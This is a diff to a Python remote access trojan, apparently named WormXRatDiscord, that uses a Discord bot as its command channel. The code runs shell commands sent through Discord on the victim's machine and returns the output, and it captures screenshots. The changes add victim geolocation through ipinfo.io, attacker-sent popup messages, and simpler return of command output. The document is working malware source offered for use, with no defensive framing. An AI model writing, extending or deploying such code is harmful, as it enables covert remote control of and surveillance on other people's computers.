@@ -1,5 +1,5 @@
-# pip install discord pillow pyautogui
-# If not works after installion librares, try pip install discord pillow pyautogui pyscreeze
+# pip install discord pillow pyautogui requests
+# If not works after installion librares, try pip install discord pillow pyautogui requests pyscreeze
 
 import discord
 import socket
@@ -7,14 +7,19 @@ import subprocess
 import pyautogui
 import os
 import uuid
+from tkinter import messagebox
+import requests
 
 session = uuid.uuid4()
-TOKEN = "" # <---- Bot token discord
+TOKEN = "Token" # <---- Bot token discord
 
 current_dir = os.getcwd()
 intents = discord.Intents.default()
 intents.message_content = True
 
+response = requests.get('https://ipinfo.io/json')
+jsondataipinfo = response.json()
+country = jsondataipinfo.get('country')
 client = discord.Client(intents=intents)
 channel_ref = None
 
@@ -27,9 +32,11 @@ async def on_ready():
     guild = client.guilds[0]
     name = get_hostname()
     channel_ref = await guild.create_text_channel(name)
-    await channel_ref.send(f"✅ Connected: {name}\n📍 Path: `{current_dir}`\n`!cmd <command>` | `!screen` to screenshot.")
-    await channel_ref.send("Type !cmd cd .. to go back and !cmd cd (folder_name) to go to another folder.")
-    await channel_ref.send(f"Session: ```{session}```")
+    await channel_ref.send(f"✅ Connected: `{name}`\n📍 Path: `{current_dir}`\n`!cmd <command>` | `!screen` to screenshot.")
+    await channel_ref.send(f"The country where the user lives: `{country}`")
+    await channel_ref.send("Type `!cmd cd ..` to go back and `!cmd cd (folder_name)` to go to another folder.")
+    await channel_ref.send("Type `!chatsendmsg (message)` to send message for user. using messagebox")
+    await channel_ref.send(f"Session: `{session}`")
 
 @client.event
 async def on_message(message):
@@ -48,7 +55,14 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"Screenshot Error: {e}")
 
-    # 
+    #
+    elif message.content.startswith("!chatsendmsg "):
+            announcemsg = message.content[len("!chatsendmsg "):].strip()
+            userip = socket.gethostbyname(socket.gethostname())
+            await message.channel.send(f"`Message sended to {userip}.`")
+            messagebox.showinfo("WormXRatDiscord", f"{announcemsg}")
+            
+
     elif message.content.startswith("!cmd "):
         cmd = message.content[5:].strip()
         
@@ -74,14 +88,7 @@ async def on_message(message):
                 encoding="cp852", errors="replace", cwd=current_dir
             )
             output = (result.stdout or result.stderr or "Executed.").strip()
-
-            if len(output) > 1900:
-                with open("outputcmd.txt", "w", encoding="utf-8") as f:
-                f.write(output)
-                await message.channel.send(file=discord.File("outputcmd.txt"))
-                os.remove("outputcmd.txt")
-            else:
-                await message.channel.send(f"```\n{output}\n```")
+            await message.channel.send(f"```\n{output}\n```")
         except Exception as e:
             await message.channel.send(f"Error: {e}")
 
